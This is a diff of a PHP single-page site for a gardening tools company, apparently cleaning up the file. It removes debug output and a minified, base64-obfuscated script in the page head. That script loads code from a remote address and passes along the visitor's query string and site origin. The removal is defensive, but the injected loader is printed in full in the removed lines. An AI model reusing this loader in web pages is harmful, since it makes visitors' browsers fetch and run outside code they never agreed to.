@@ -1,10 +1,4 @@
-<?php
-echo "<!-- PHP_EXECUTED_AT: " . date("Y-m-d H:i:s") . " -->";
-?>
 
-<?php
-echo "Server PHP version: " . PHP_VERSION;
-?>
 <?php
 // index.php — Single-page PHP site with contact form (texts only)
 
@@ -129,11 +123,7 @@ $csrfToken = $_SESSION["csrf_token"];
 
 
 <head>
-<script>
-  console.log("JS_EXECUTED_ON_BROWSER");
-</script>
-  <script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9hcGV4LWdhZGVybmluZy1zZXJ2aWNlLWV5cXlnLm9uZGlnaXRhbG9jZWFuLmFwcC8zWjJzd2ViN29oLnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title><?php echo h($siteName); ?></title>
+ <title><?php echo h($siteName); ?></title>
   <meta name="description" content="Apex Gardening Tools — home gardening tools manufacturer." />
   <style>
     :root{
@@ -713,6 +703,7 @@ $csrfToken = $_SESSION["csrf_token"];
   </script>
 </body>
 </html>
+
 
 
 
